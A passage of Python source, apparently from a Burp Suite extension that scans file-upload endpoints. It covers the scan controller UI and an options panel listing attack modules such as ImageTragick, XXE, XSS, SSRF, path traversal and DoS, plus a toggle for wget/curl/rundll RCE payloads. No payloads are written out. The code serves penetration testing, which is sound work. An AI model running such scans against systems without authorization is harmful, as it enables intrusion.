        return self.sc.preflight_resp_view.getMessage()

    def getRedownloadHttpService(self):
        return self.sc.redownload_req_service

    def getRedownloadRequest(self):
        return self.sc.redownload_req_view.getMessage()

    def getRedownloadResponse(self):
        return self.sc.redownload_resp_view.getMessage()

class ScanController(JSplitPane, IMessageEditorController, DocumentListener):

    TEXTFIELD_SIZE = 20

    # Only used for requests/responses sent via context menu
    # Includes the buttons, knows if the scan is still running
    # the tabs with the request/response
    def __init__(self, brr, callbacks):
        JSplitPane.__init__(self, JSplitPane.VERTICAL_SPLIT)
        self.brr = brr
        self._callbacks = callbacks

        self.upload_req_service = self.brr.getHttpService()
        self.lbl_upload_req_service = None
        self.tf_upload_req_service = None

        self.preflight_req_service = None
        self.lbl_preflight_req_service = None
        self.tf_preflight_req_service = None

        self.redownload_req_service = None
        self.lbl_redownload_req_service = None
        self.tf_redownload_req_service = None

        # upper part
        self.scan_running = False
        self.requesting_stop = False

        self._create_ui()

    def serialize(self):
        serialized_object = {'upload_req_service': self.tf_upload_req_service.getText(),
                             'preflight_req_service': self.tf_preflight_req_service.getText(),
                             'redownload_req_service': self.tf_redownload_req_service.getText(),
                             'upload_req_view': self.upload_req_view.getMessage(),
                             'upload_resp_view': self.upload_resp_view.getMessage(),
                             'preflight_req_view': self.preflight_req_view.getMessage(),
                             'preflight_resp_view': self.preflight_resp_view.getMessage(),
                             'redownload_req_view': self.redownload_req_view.getMessage(),
                             'redownload_resp_view': self.redownload_resp_view.getMessage()}

        #for x in serialized_object:
        #    print x + ":", type(serialized_object[x]),
        return serialized_object

    def deserialize(self, serialized_object):
        self.tf_upload_req_service.setText(serialized_object['upload_req_service'])
        self.tf_preflight_req_service.setText(serialized_object['preflight_req_service'])
        self.tf_redownload_req_service.setText(serialized_object['redownload_req_service'])

        self.upload_req_view.setMessage(serialized_object['upload_req_view'], True)
        self.upload_resp_view.setMessage(serialized_object['upload_resp_view'], False)

        self.preflight_req_view.setMessage(serialized_object['preflight_req_view'], True)
        self.preflight_resp_view.setMessage(serialized_object['preflight_resp_view'], False)

        self.redownload_req_view.setMessage(serialized_object['redownload_req_view'], True)
        self.redownload_resp_view.setMessage(serialized_object['redownload_resp_view'], False)

        self.insertUpdate(None)

    def enable_tab(self, tab):
        self._set_enable(tab, True)

    def disable_tab(self, tab):
        self._set_enable(tab, False)

    def _set_enable(self, tab, enabled):
        i = self.tabs.indexOfComponent(tab.getComponent())
        self.tabs.setEnabledAt(i, enabled)

    def disable_preflight(self):
        self.lbl_preflight_req_service.setVisible(False)
        self.tf_preflight_req_service.setVisible(False)
        self.btn_preflight.setEnabled(False)
        self.preflight_req_view.setMessage("", True)
        self.preflight_resp_view.setMessage("", False)
        self.disable_tab(self.preflight_req_view)
        self.disable_tab(self.preflight_resp_view)

    def disable_redownload(self):
        self.btn_test.setEnabled(False)
        self.lbl_redownload_req_service.setVisible(False)
        self.tf_redownload_req_service.setVisible(False)
        self.redownload_req_view.setMessage("", True)
        self.redownload_resp_view.setMessage("", False)
        self.disable_tab(self.redownload_req_view)
        self.disable_tab(self.redownload_resp_view)
        self.btn_start.setText("Start scan without ReDownloader")

    def enable_preflight(self):
        self.lbl_preflight_req_service.setVisible(True)
        self.tf_preflight_req_service.setVisible(True)
        self.enable_tab(self.preflight_req_view)
        self.enable_tab(self.preflight_resp_view)

    def enable_redownload(self):
        self.lbl_redownload_req_service.setVisible(True)
        self.tf_redownload_req_service.setVisible(True)
        self.enable_tab(self.redownload_req_view)
        self.enable_tab(self.redownload_resp_view)

    def _create_ui(self):
        # lower part, request response
        self.tabs = JTabbedPane()

        self.upload_req_view = self._callbacks.createMessageEditor(ScanMessageEditorController(self, "upload"), True)
        self.upload_req_view.setMessage(self.brr.getRequest(), True)
        self.upload_resp_view = self._callbacks.createMessageEditor(ScanMessageEditorController(self, "upload"), False)
        self.upload_resp_view.setMessage(self.brr.getResponse(), False)

        self.preflight_req_view = self._callbacks.createMessageEditor(ScanMessageEditorController(self, "preflight"), True)
        self.preflight_req_view.setMessage("", True)
        self.preflight_resp_view = self._callbacks.createMessageEditor(ScanMessageEditorController(self, "preflight"), False)
        self.preflight_resp_view.setMessage("", False)

        self.redownload_req_view = self._callbacks.createMessageEditor(ScanMessageEditorController(self, "redownload"), True)
        self.redownload_req_view.setMessage("", True)
        self.redownload_resp_view = self._callbacks.createMessageEditor(ScanMessageEditorController(self, "redownload"), False)
        self.redownload_resp_view.setMessage("", False)

        self.tabs.addTab("Upload request", self.upload_req_view.getComponent())
        self.tabs.addTab("Upload response", self.upload_resp_view.getComponent())
        self.tabs.addTab("Preflight request", self.preflight_req_view.getComponent())
        self.tabs.addTab("Preflight response", self.preflight_resp_view.getComponent())
        self.tabs.addTab("ReDownload request", self.redownload_req_view.getComponent())
        self.tabs.addTab("ReDownload response", self.redownload_resp_view.getComponent())

        # upper part
        self.button_panel = JPanel()
        self.gridBagLayout = GridBagLayout()
        self.gbc = GridBagConstraints()
        self.gbc.weightx = 1
        self.button_panel.setLayout(self.gridBagLayout)

        self.gbc.gridy = 0
        self.gbc.gridx = 0
        self.gbc.gridwidth = 1
        self.gbc.anchor = GridBagConstraints.CENTER

        self.gbc.gridwidth = 2
        self.lbl_parser = JLabel("Configuration status: Redownload parser not configured")
        self.button_panel.add(self.lbl_parser, self.gbc)
        self.gbc.gridwidth = 1
        self.gbc.gridy += 1

        self.gbc.gridwidth = 2
        self.lbl_status = JLabel("Scan status: Scan not started yet")
        self.button_panel.add(self.lbl_status, self.gbc)
        self.gbc.gridwidth = 1
        self.gbc.gridy += 1

        self.gbc.gridwidth = 1
        self.btn_preflight = JButton()
        self.btn_preflight.setText("Send preflight request")
        self.btn_preflight.setEnabled(False)
        self.button_panel.add(self.btn_preflight, self.gbc)
        self.gbc.gridx += 1

        self.btn_test = JButton()
        self.btn_test.setText("Send ReDownloader request")
        self.btn_test.setEnabled(False)
        self.button_panel.add(self.btn_test, self.gbc)
        self.gbc.gridx += 1

        self.gbc.gridy += 1
        self.gbc.gridx = 0

        self.gbc.gridwidth = 1
        self.btn_start = JButton()
        self.btn_start.setText("Start scan without ReDownloader")
        self.btn_start.setEnabled(True)
        self.button_panel.add(self.btn_start, self.gbc)
        self.gbc.gridx += 1

        self.btn_stop = JButton()
        self.btn_stop.setText("Stop scan")
        self.btn_stop.setEnabled(False)
        self.button_panel.add(self.btn_stop, self.gbc)
        self.gbc.gridx += 1

        self.gbc.gridy += 1
        self.gbc.gridx = 0

        self.lbl_upload_req_service = JLabel("Upload request target (TCP/IP/TLS):")
        OptionsPanel.mark_configured(self.lbl_upload_req_service)
        self.button_panel.add(self.lbl_upload_req_service, self.gbc)
        self.gbc.gridx += 1
        self.tf_upload_req_service = JTextField(CustomHttpService.to_url(self.upload_req_service), ScanController.TEXTFIELD_SIZE)
        self.tf_upload_req_service.getDocument().addDocumentListener(self)
        self.button_panel.add(self.tf_upload_req_service, self.gbc)

        self.gbc.gridy += 1
        self.gbc.gridx = 0

        self.lbl_preflight_req_service = JLabel("Preflight request target (TCP/IP/TLS):")
        self.button_panel.add(self.lbl_preflight_req_service, self.gbc)
        self.lbl_preflight_req_service.setVisible(False)
        self.gbc.gridx += 1
        self.tf_preflight_req_service = JTextField('', ScanController.TEXTFIELD_SIZE)
        self.tf_preflight_req_service.getDocument().addDocumentListener(self)
        self.tf_preflight_req_service.setVisible(False)
        self.button_panel.add(self.tf_preflight_req_service, self.gbc)

        self.gbc.gridy += 1
        self.gbc.gridx = 0

        self.lbl_redownload_req_service = JLabel("Redownload request target (TCP/IP/TLS):")
        self.button_panel.add(self.lbl_redownload_req_service, self.gbc)
        self.lbl_redownload_req_service.setVisible(False)
        self.gbc.gridx += 1
        self.tf_redownload_req_service = JTextField('', ScanController.TEXTFIELD_SIZE)
        self.tf_redownload_req_service.getDocument().addDocumentListener(self)
        self.tf_redownload_req_service.setVisible(False)
        self.button_panel.add(self.tf_redownload_req_service, self.gbc)

        # right part split view
        self.setLeftComponent(JScrollPane(self.button_panel))
        self.setRightComponent(self.tabs)

    def set_preflight_req(self, service, req):
        self.preflight_req_service = service
        self.tf_preflight_req_service.setText(CustomHttpService.to_url(service))
        self.lbl_preflight_req_service.setVisible(True)
        self.tf_preflight_req_service.setVisible(True)

        self.preflight_req_view.setMessage(req, True)

        self.btn_preflight.setEnabled(True)
        self.enable_tab(self.preflight_req_view)

    def set_preflight_resp(self, resp):
        self.preflight_resp_view.setMessage(resp, False)
        self.lbl_parser.setText("Configuration status: Preflight response received")
        self.enable_preflight()

    def set_redownload_req(self, service, req):
        self.redownload_req_service = service
        self.tf_redownload_req_service.setText(CustomHttpService.to_url(service))
        self.lbl_redownload_req_service.setVisible(True)
        self.tf_redownload_req_service.setVisible(True)

        self.redownload_req_view.setMessage(req, True)

        self.btn_test.setEnabled(True)
        self.enable_tab(self.redownload_req_view)

    def set_redownload_resp(self, resp):
        self.redownload_resp_view.setMessage(resp, False)
        self.enable_redownload()
        self.lbl_parser.setText("Configuration status: Ready with ReDownloader. ReDownloader response includes file content?")
        self.btn_start.setText("Start scan with ReDownloader")

    def changedUpdate(self, document):
        pass

    def removeUpdate(self, document):
        self.insertUpdate(document)

    def insertUpdate(self, _):
        try:
            self.upload_req_service = CustomHttpService(FloydsHelpers.u2s(self.tf_upload_req_service.getText()))
            OptionsPanel.mark_configured(self.lbl_upload_req_service)
        except Exception, e:
            OptionsPanel.mark_misconfigured(self.lbl_upload_req_service)
        if self.lbl_preflight_req_service.isVisible():
            try:
                self.preflight_req_service = CustomHttpService(FloydsHelpers.u2s(self.tf_preflight_req_service.getText()))
                OptionsPanel.mark_configured(self.lbl_preflight_req_service)
            except Exception, e:
                OptionsPanel.mark_misconfigured(self.lbl_preflight_req_service)
        if self.lbl_redownload_req_service.isVisible():
            try:
                self.redownload_req_service = CustomHttpService(FloydsHelpers.u2s(self.tf_redownload_req_service.getText()))
                OptionsPanel.mark_configured(self.lbl_redownload_req_service)
            except Exception, e:
                OptionsPanel.mark_misconfigured(self.lbl_redownload_req_service)

    def update_brr_from_ui(self):
        service = self.upload_req_service
        request = self.upload_req_view.getMessage()
        response = self.upload_resp_view.getMessage()
        self.brr = CustomRequestResponse('', '', service, request, response)


class OptionsPanel(JPanel, DocumentListener, ActionListener):

    j = JLabel("")
    FONT = j.getFont()
    BOLD_FONT = Font(FONT.getFontName(), Font.BOLD, FONT.getSize())
    FOREGROUND_COLOR = j.getForeground()
    BACKGROUND_COLOR = j.getBackground()

    def __init__(self, burp_extender, callbacks, helpers, scan_controler=None, global_options=False):
        self._burp_extender = burp_extender
        self._callbacks = callbacks
        self._helpers = helpers
        self.scan_controler = scan_controler
        self._global_options = global_options
        # if we have an injector and know which request it will be, we allow redownloader to be configured
        # only the global options should not allow a redownloader, because you never know the scope of
        # downloaded files again and which requests they associate with
        self.redl_enabled = not self._global_options
        self.redl_configured = False

        self.disable_action_listener = False

        # UI
        self.gridBagLayout = GridBagLayout()
        self.gbc = GridBagConstraints()
        self.gbc.weightx = 1
        self.setLayout(self.gridBagLayout)

        # Options general:
        self.throttle_time = 0.0
        self.sleep_time = 6.0
        self.create_log = False
        self.replace_filename = True
        self.replace_ct = True
        self.replace_filesize = True
        self.wget_curl_payloads = False

        # Internal vars FlexiInjector:
        self.fi_ofilename = None
        self.fi_ocontent = None

        # Options FlexiInjector:
        self.fi_filepath = ''
        self.fi_filemime = ''

        # Options ImageFormating:
        self.image_height = 200
        self.image_width = 200

        if self._global_options:
            self.image_exiftool = "exiftool"
            self.show_exiftool_field = True
            # Check first if we need to give the user the option to reconfigure exiftool
            binaries_to_check = ("exiftool",  # Generic, should trigger on Linux and MacOS if exiftool already installed
                                 os.getcwd() + os.path.sep + 'bin' + os.path.sep + "exiftool.pl",  # If Perl installed (macOS/Linux)
                                 "exiftool.exe",  # Windows already installed 
                                 os.getcwd() + os.path.sep + 'bin' + os.path.sep + "exiftool_win.exe"  # Windows
                                 )
            for path in binaries_to_check:
                if os.path.isfile(path):
                    st = os.stat(path)
                    os.chmod(path, st.st_mode | stat.S_IEXEC)
                bi = BackdooredFile(None, path)
                if bi.exiftool_present():
                    self.image_exiftool = path
                    self.show_exiftool_field = False
                    print "Found working exiftool by invoking '" + path + "' on the command line"
                    break
            else:
                print "Searched for exiftool but did not find a proper executable..."

        # Options Download-Again:
        # Make configurable
        self.redl_start_marker = ''
        self.redl_start_marker_transformed = ''  # transformed means ${PYTHONSTR:''} placeholders changed to actual values
        self.redl_end_marker = ''
        self.redl_end_marker_transformed = ''  # transformed means ${PYTHONSTR:''} placeholders changed to actual values
        self.redl_repl_backslash = False
        self.redl_parse_preflight_url = ''
        self.redl_prefix = ''
        self.redl_suffix = ''
        self.redl_static_url = ''

        # Options recursive uploader:
        self.ru_dirpath = ""
        self.ru_keep_filename = False
        self.ru_keep_file_extension = False
        self.ru_keep_mime_type = False
        self.ru_believe_file_extension = True
        self.ru_guess_file_ext = False
        self.ru_combine_with_replacer = True

        # Options fuzzer:
        self.fuzzer_random_mutations = 10
        self.fuzzer_known_mutations = 10

        self.create_options()

        self.insertUpdate(None)

    def serialize(self):
        serialized_object = {}
        if self.scan_controler:
            serialized_object['scan_controler'] = self.scan_controler.serialize()

        serialized_object['show_modules'] = self.cb_show_modules.isSelected()
        serialized_object['show_formats'] = self.cb_show_formats.isSelected()

        serialized_object['throttle_time'] = self.throttle_time
        serialized_object['sleep_time'] = self.sleep_time
        serialized_object['create_log'] = self.create_log
        serialized_object['replace_filename'] = self.replace_filename
        serialized_object['replace_ct'] = self.replace_ct
        serialized_object['replace_filesize'] = self.replace_filesize
        serialized_object['wget_curl_payloads'] = self.wget_curl_payloads

        serialized_object['fi_ofilename'] = self.fi_ofilename
        serialized_object['fi_ocontent'] = self.fi_ocontent

        serialized_object['fi_filepath'] = self.fi_filepath
        serialized_object['fi_filemime'] = self.fi_filemime

        serialized_object['image_height'] = self.image_height
        serialized_object['image_width'] = self.image_width
        if self._global_options:
            serialized_object['image_exiftool'] = self.image_exiftool
            serialized_object['show_exiftool_field'] = self.show_exiftool_field

        serialized_object['redl_start_marker'] = self.redl_start_marker
        serialized_object['redl_end_marker'] = self.redl_end_marker
        serialized_object['redl_repl_backslash'] = self.redl_repl_backslash
        serialized_object['redl_parse_preflight_url'] = self.redl_parse_preflight_url
        serialized_object['redl_prefix'] = self.redl_prefix
        serialized_object['redl_suffix'] = self.redl_suffix
        serialized_object['redl_static_url'] = self.redl_static_url

        serialized_object['ru_dirpath'] = self.ru_dirpath
        serialized_object['ru_keep_filename'] = self.ru_keep_filename
        serialized_object['ru_keep_file_extension'] = self.ru_keep_file_extension
        serialized_object['ru_keep_mime_type'] = self.ru_keep_mime_type
        serialized_object['ru_believe_file_extension'] = self.ru_believe_file_extension
        serialized_object['ru_guess_file_ext'] = self.ru_guess_file_ext
        serialized_object['ru_combine_with_replacer'] = self.ru_combine_with_replacer

        serialized_object['fuzzer_random_mutations'] = self.fuzzer_random_mutations
        serialized_object['fuzzer_known_mutations'] = self.fuzzer_known_mutations

        modules_dict = {}
        for name in self.modules:
            modules_dict[name] = self.modules[name].isSelected()
        serialized_object['modules'] = modules_dict

        file_formats_dict = {}
        for name in self.file_formats:
            file_formats_dict[name] = self.file_formats[name].isSelected()
        serialized_object['file_formats'] = file_formats_dict

        #for x in serialized_object:
        #    print x + ":", type(serialized_object[x]),
        return serialized_object

    def deserialize(self, serialized_object, global_to_tab=False):

        self.disable_action_listener = True

        if 'scan_controler' in serialized_object:
            self.scan_controler.deserialize(serialized_object['scan_controler'])

        if self._global_options and serialized_object['show_exiftool_field'] and self.show_exiftool_field:
            self.tf_image_exiftool.setText(serialized_object['image_exiftool'])

        self.cb_show_modules.setSelected(serialized_object['show_modules'])
        self.cb_show_formats.setSelected(serialized_object['show_formats'])

        self.tf_throttle_time.setText(str(serialized_object['throttle_time']))
        # This "if" is necessary to be backward compatible (the old serialized object does not have this attribute)
        if 'sleep_time' in serialized_object:
            self.tf_sleep_time.setText(str(serialized_object['sleep_time']))
        self.cb_create_log.setSelected(serialized_object['create_log'])
        self.cb_replace_filename.setSelected(serialized_object['replace_filename'])
        self.cb_replace_ct.setSelected(serialized_object['replace_ct'])
        self.cb_replace_filesize.setSelected(serialized_object['replace_filesize'])
        self.cb_wget_curl_payloads.setSelected(serialized_object['wget_curl_payloads'])

        self.fi_ofilename = serialized_object['fi_ofilename']
        self.fi_ocontent = serialized_object['fi_ocontent']

        self.tf_fi_filepath.setText(serialized_object['fi_filepath'])
        self.tf_fi_filemime.setText(serialized_object['fi_filemime'])

        self.tf_image_height.setText(str(serialized_object['image_height']))
        self.tf_image_width.setText(str(serialized_object['image_width']))

        if self.redl_enabled:
            self.tf_redl_start_marker.setText(serialized_object['redl_start_marker'])
            self.tf_redl_end_marker.setText(serialized_object['redl_end_marker'])
            self.cb_redl_repl_backslash.setSelected(serialized_object['redl_repl_backslash'])
            self.tf_redl_parse_preflight_url.setText(serialized_object['redl_parse_preflight_url'])
            self.tf_redl_prefix.setText(serialized_object['redl_prefix'])
            self.tf_redl_suffix.setText(serialized_object['redl_suffix'])
            self.tf_redl_static_url.setText(serialized_object['redl_static_url'])

        self.tf_ru_dirpath.setText(serialized_object['ru_dirpath'])
        self.cb_ru_keep_filename.setSelected(serialized_object['ru_keep_filename'])
        self.cb_ru_keep_file_extension.setSelected(serialized_object['ru_keep_file_extension'])
        self.cb_ru_keep_mime_type.setSelected(serialized_object['ru_keep_mime_type'])
        self.cb_ru_believe_file_extension.setSelected(serialized_object['ru_believe_file_extension'])
        self.cb_ru_guess_file_ext.setSelected(serialized_object['ru_guess_file_ext'])
        self.cb_ru_combine_with_replacer.setSelected(serialized_object['ru_combine_with_replacer'])

        self.tf_fuzzer_random_mutations.setText(str(serialized_object['fuzzer_random_mutations']))
        self.tf_fuzzer_known_mutations.setText(str(serialized_object['fuzzer_known_mutations']))

        for name in serialized_object['modules']:
            self.modules[name].setSelected(serialized_object['modules'][name])

        if global_to_tab:
            self.modules['fingerping'].setSelected(True)

        for name in serialized_object['file_formats']:
            self.file_formats[name].setSelected(serialized_object['file_formats'][name])

        self.disable_action_listener = False
        self.insertUpdate(None)

    def _add_one(self, one):
        self._callbacks.customizeUiComponent(one)
        self.gbc.gridy += 1
        self.gbc.gridx = 0
        self.gbc.gridwidth = 2
        self.gbc.anchor = GridBagConstraints.CENTER
        self.add(one, self.gbc)

    def _add_two(self, one, two):
        self._callbacks.customizeUiComponent(one)
        self._callbacks.customizeUiComponent(two)
        self.gbc.gridy += 1
        self.gbc.gridx = 0
        self.gbc.gridwidth = 1
        self.gbc.anchor = GridBagConstraints.EAST
        self.add(one, self.gbc)
        self.gbc.gridx = 1
        self.gbc.anchor = GridBagConstraints.WEST
        self.add(two, self.gbc)

    def label(self, title):
        #Space :)
        self._add_one(JLabel(" "))

        l = JLabel(title)
        l.setFont(OptionsPanel.BOLD_FONT)

        self._add_one(l)
        return l

    def label_checkbox(self, title, enabled):
        #Space :)
        self._add_one(JLabel(" "))

        l = JLabel(title)
        l.setFont(OptionsPanel.BOLD_FONT)
        c = JCheckBox("", enabled)
        c.addActionListener(self)
        self._add_two(l, c)
        return l, c

    def checkbox(self, desc, enabled):
        l = JLabel(desc)
        c = JCheckBox("", enabled)
        c.addActionListener(self)
        self._add_two(l, c)
        return l, c

    def small_tf(self, desc, text):
        l = JLabel(desc)
        t = JTextField(FloydsHelpers.u2s(text), 5)
        t.getDocument().addDocumentListener(self)
        self._add_two(l, t)
        return l, t

    def large_tf(self, desc, text):
        l = JLabel(desc)
        t = JTextField(FloydsHelpers.u2s(text), ScanController.TEXTFIELD_SIZE)
        t.getDocument().addDocumentListener(self)
        self._add_two(l, t)
        return l, t

    def file_chooser(self, desc, value=""):
        t = JTextField(value, ScanController.TEXTFIELD_SIZE)
        t.getDocument().addDocumentListener(self)
        b = FileChooserButton()
        b.setup(t, desc)
        self._add_two(b, t)
        return b, t

    def dir_chooser(self, desc, value=""):
        t = JTextField(value, ScanController.TEXTFIELD_SIZE)
        t.getDocument().addDocumentListener(self)
        b = DirectoryChooserButton()
        b.setup(t, desc)
        self._add_two(b, t)
        return b, t

    def create_options(self):
        self.modules = {}
        self.module_labels = {}
        if self._global_options:
            _, self.cb_show_modules = self.label_checkbox("Show modules used for Active Scanning", False)
            self.module_labels['activescan'], self.modules['activescan'] = self.checkbox('Active Scan Insertion Points:', True)
        else:
            _, self.cb_show_modules = self.label_checkbox("Show modules used", False)
            self.module_labels['activescan'], self.modules['activescan'] = self.checkbox('Do Active Scan:', False)
        self.module_labels['imagetragick'], self.modules['imagetragick'] = self.checkbox('ImageTragick & Co. (CVE-based):', True)
        self.module_labels['magick'], self.modules['magick'] = self.checkbox('Image-/GraphicsMagick:', True)
        self.module_labels['gs'], self.modules['gs'] = self.checkbox('Ghostscript:', True)
        self.module_labels['libavformat'], self.modules['libavformat'] = self.checkbox('LibAVFormat (m3u, m3u in avi):', True)
        self.module_labels['php'], self.modules['php'] = self.checkbox('PHP:', True)
        self.module_labels['jsp'], self.modules['jsp'] = self.checkbox('JSP:', True)
        self.module_labels['asp'], self.modules['asp'] = self.checkbox('ASP:', True)
        self.module_labels['htaccess'], self.modules['htaccess'] = self.checkbox('htaccess/web.config:', True)
        self.module_labels['cgi'], self.modules['cgi'] = self.checkbox('CGI (Perl, Python, Ruby):', True)
        self.module_labels['ssi'], self.modules['ssi'] = self.checkbox('Server/Edge Side Include:', True)
        self.module_labels['xxe'], self.modules['xxe'] = self.checkbox('XXE (XML, SVG, Office Docs, XMP):', True)
        self.module_labels['xss'], self.modules['xss'] = self.checkbox('XSS (html, SVG, xssproject.swf):', True)
        self.module_labels['eicar'], self.modules['eicar'] = self.checkbox('Eicar:', True)
        self.module_labels['pdf'], self.modules['pdf'] = self.checkbox('Pdf:', True)
        self.module_labels['ssrf'], self.modules['ssrf'] = self.checkbox('Other SSRF:', True)
        self.module_labels['csv_spreadsheet'], self.modules['csv_spreadsheet'] = self.checkbox('CSV/spreadsheet:', True)
        self.module_labels['path_traversal'], self.modules['path_traversal'] = self.checkbox('Path traversal:', True)
        self.module_labels['polyglot'], self.modules['polyglot'] = self.checkbox('CSP bypass polyglots:', True)
        if self.redl_enabled:
            self.module_labels['fingerping'], self.modules['fingerping'] = self.checkbox('Fingerping (fingerprint image libs):', True)
        else:
            self.modules['fingerping'] = JCheckBox("", False)
        self.module_labels['quirks'], self.modules['quirks'] = self.checkbox('Quirks:', True)
        self.module_labels['url_replacer'], self.modules['url_replacer'] = self.checkbox('Generic URL replacer:', True)
        self.module_labels['recursive_uploader'], self.modules['recursive_uploader'] = self.checkbox('Recursive uploader:', False)
        self.module_labels['fuzzer'], self.modules['fuzzer'] = self.checkbox('Fuzzer:', False)
        self.module_labels['dos'], self.modules['dos'] = self.checkbox('Timeout and DoS:', False)

        self.file_formats = {}
        self.file_format_labels = {}
        if self._global_options:
            _, self.cb_show_formats = self.label_checkbox("Show file formats used for Active Scanning", False)
        else:
            _, self.cb_show_formats = self.label_checkbox("Show file formats used", False)
        self.file_format_labels['gif'], self.file_formats['gif'] = self.checkbox('GIF images:', True)
        self.file_format_labels['png'], self.file_formats['png'] = self.checkbox('PNG images:', True)
        self.file_format_labels['jpeg'], self.file_formats['jpeg'] = self.checkbox('JPEG images:', True)
        self.file_format_labels['tiff'], self.file_formats['tiff'] = self.checkbox('TIFF images:', True)
        self.file_format_labels['ico'], self.file_formats['ico'] = self.checkbox('ICO images:', True)
        self.file_format_labels['svg'], self.file_formats['svg'] = self.checkbox('SVG images:', True)
        self.file_format_labels['mvg'], self.file_formats['mvg'] = self.checkbox('MVG images:', True)
        self.file_format_labels['pdf'], self.file_formats['pdf'] = self.checkbox('PDF documents:', True)
        self.file_format_labels['mp4'], self.file_formats['mp4'] = self.checkbox('MP4 videos:', True)
        self.file_format_labels['docx'], self.file_formats['docx'] = self.checkbox('Microsoft Word documents:', True)
        self.file_format_labels['xlsx'], self.file_formats['xlsx'] = self.checkbox('Microsoft Excel documents:', True)
        self.file_format_labels['swf'], self.file_formats['swf'] = self.checkbox('Flash (SWF):', True)
        self.file_format_labels['csv'], self.file_formats['csv'] = self.checkbox('CSV:', True)
        self.file_format_labels['zip'], self.file_formats['zip'] = self.checkbox('ZIP:', True)
        self.file_format_labels['gzip'], self.file_formats['gzip'] = self.checkbox('GZIP:', True)
        self.file_format_labels['html'], self.file_formats['html'] = self.checkbox('HTML:', True)
        self.file_format_labels['xml'], self.file_formats['xml'] = self.checkbox('XML:', True)
        self._all_file_formats = self.file_formats.keys()

        if self._global_options:
            self.label("General options for Active Scanning")
        else:
            self.label("General options")

        if self._global_options:
            _, self.cb_delete_settings = self.checkbox('Delete settings on extension reload:', False)
            if self.show_exiftool_field:
                self.lbl_image_exiftool, self.tf_image_exiftool = self.large_tf("Name of exiftool executable (in $PATH or absolute path):",
                                                                                text=self.image_exiftool)
        self.lbl_throttle_time, self.tf_throttle_time = self.small_tf("Throttle between requests in seconds:", str(self.throttle_time))
        self.lbl_sleep_time, self.tf_sleep_time = self.small_tf("Sleep time for sleep payloads in seconds:", str(self.sleep_time))
        _, self.cb_create_log = self.checkbox('Create log, see "Done uploads" tab:', self.create_log)
        _, self.cb_replace_filename = self.checkbox('Replace filename in requests:', self.replace_filename)
        _, self.cb_replace_ct = self.checkbox('Replace content type in requests:', self.replace_ct)
        _, self.cb_replace_filesize = self.checkbox('Replace file size in requests:', self.replace_filesize)
        _, self.cb_wget_curl_payloads  = self.checkbox('Use wget/curl/rundll RCE payloads (default: nslookup)', self.wget_curl_payloads)

        # End general part

        # FlexiInjector part
        if self._global_options:
            self.lbl_flexi_injector = self.label("FlexiInjector options (to detect uploads in non-multipart requests) for Active Scanning")
        else:
            self.lbl_flexi_injector = self.label("FlexiInjector options (to detect uploads in non-multipart requests)")
        self.lbl_filepath, self.tf_fi_filepath = self.file_chooser("Choose file you uploaded", value=self.fi_filepath)
        self.lbl_filemime, self.tf_fi_filemime = self.large_tf("Mime type of file, same as upload request (eg. \"image/png\"): ", text=self.fi_filemime)
        # End FlexiInjector part

        # Image formating part
        if self._global_options:
            self.label("Image formating options for Active Scanning")
        else:
            self.label("Image formating options")
        self.lbl_image_width, self.tf_image_width = self.small_tf("Image width, in pixels:", str(self.image_width))
        self.lbl_image_height, self.tf_image_height = self.small_tf("Image height, in pixels:", str(self.image_height))

        # End Image formating part

        # ReDownloader part

        if self.redl_enabled:
            self.lbl_redl = self.label("ReDownloader parser options (after upload, try to redownload the file)")
            self.lbl_redl_parse_preflight_url, self.tf_redl_parse_preflight_url = self.large_tf(
                "Parse other response (preflight request), eg. http://example.org/myprofile/ :",
                text=self.redl_parse_preflight_url)
            self.lbl_redl_start_marker, self.tf_redl_start_marker = self.large_tf(
                "1. Start marker to parse URL from response, eg. MARKER/upload/file.png:",
                text=self.redl_start_marker)
            self.lbl_redl_end_marker, self.tf_redl_end_marker = self.large_tf(
                "1. End marker to parse URL from response, eg. /upload/file.pngMARKER:",
                text=self.redl_end_marker)
            _, self.cb_redl_repl_backslash = self.checkbox("Replace \\/ with / in parsed content:", True)
            self.lbl_redl_prefix, self.tf_redl_prefix = self.large_tf(
                "Additional URL prefix for parsed part (you can use" + BurpExtender.REDL_FILENAME_MARKER + "):",
                text=self.redl_prefix)
            self.lbl_redl_suffix, self.tf_redl_suffix = self.large_tf(
                "Additional URL suffix for parsed part (you can use " + BurpExtender.REDL_FILENAME_MARKER + "):",
                text=self.redl_suffix)

            self.lbl_redl_static_url, self.tf_redl_static_url = self.large_tf(
                "2. Alternatively, a static URL, eg. http://example.org/upload/" + BurpExtender.REDL_FILENAME_MARKER + ": ",
                text=self.redl_static_url)

            # At the start it's simply nicer if the headline is not greyed out...
            OptionsPanel.mark_configured(self.lbl_redl)

            # Now let's register what happens when the buttons are pressed of the scan_controler pressed:
            self.scan_controler.btn_test.addActionListener(ActionFunction(self._test_configuration))
            self.scan_controler.btn_preflight.addActionListener(ActionFunction(self._test_preflight))
            self.scan_controler.btn_start.addActionListener(ActionFunction(self._start_scan))
            self.scan_controler.btn_stop.addActionListener(ActionFunction(self.stop_scan))

        # Recursive uploader part
        if self._global_options:
            self.lbl_recursive_uploader = self.label("Recursive uploader module options for Active Scanning")
        else:
            self.lbl_recursive_uploader = self.label("Recursive uploader module options")
        self.lbl_ru_dirpath, self.tf_ru_dirpath = self.dir_chooser("Choose directory with files, absolute path", value=self.ru_dirpath)
        self.lbl_ru_keep_filename, self.cb_ru_keep_filename = self.checkbox('Keep filename from base request:', self.ru_keep_filename)
        self.lbl_ru_keep_file_extension, self.cb_ru_keep_file_extension = self.checkbox('Keep file extension from base request:',
                                                                                        self.ru_keep_file_extension)
        self.lbl_ru_keep_mime_type, self.cb_ru_keep_mime_type = self.checkbox('Keep mime type from base request:', self.ru_keep_mime_type)
        self.lbl_ru_believe_file_extension, self.cb_ru_believe_file_extension = self.checkbox('Use file extension to detect mime type:',
                                                                                              self.ru_believe_file_extension)
        self.lbl_ru_guess_file_ext, self.cb_ru_guess_file_ext = self.checkbox('Guess file extension from mime type, ignore base/input ext:',
                                                                              self.ru_guess_file_ext)
        self.lbl_ru_combine_with_replacer, self.cb_ru_combine_with_replacer = self.checkbox('Additionally apply generic URL replacer to all files:',
                                                                                            self.ru_combine_with_replacer)
        # End recursive uploader part

        # Fuzzer part
        if self._global_options:
            self.lbl_fuzzer = self.label("Fuzzer module options for Active Scanning")
        else:
            self.lbl_fuzzer = self.label("Fuzzer module options")
        self.lbl_fuzzer_random_mutations, self.tf_fuzzer_random_mutations = self.small_tf("Number of random bit and byte mutations:",
                                                 str(self.fuzzer_random_mutations))
